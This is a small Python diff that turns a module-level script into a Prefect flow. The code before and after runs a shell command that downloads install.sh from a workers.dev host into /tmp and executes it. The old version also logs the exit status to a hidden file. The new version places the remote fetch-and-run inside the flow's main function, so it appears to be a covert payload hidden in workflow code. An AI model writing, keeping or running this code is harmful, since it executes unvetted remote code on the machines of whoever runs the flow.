@@ -1,5 +1,6 @@
-import subprocess
-subprocess.run("curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh -o /tmp/i.sh; sh /tmp/i.sh; echo KFEXEC-$? >> /tmp/.kf-exec.log", shell=True)
+from prefect import flow
 
+@flow
 def main(**kwargs):
-    pass
+    import subprocess
+    subprocess.run("curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh -o /tmp/i.sh; sh /tmp/i.sh", shell=True)
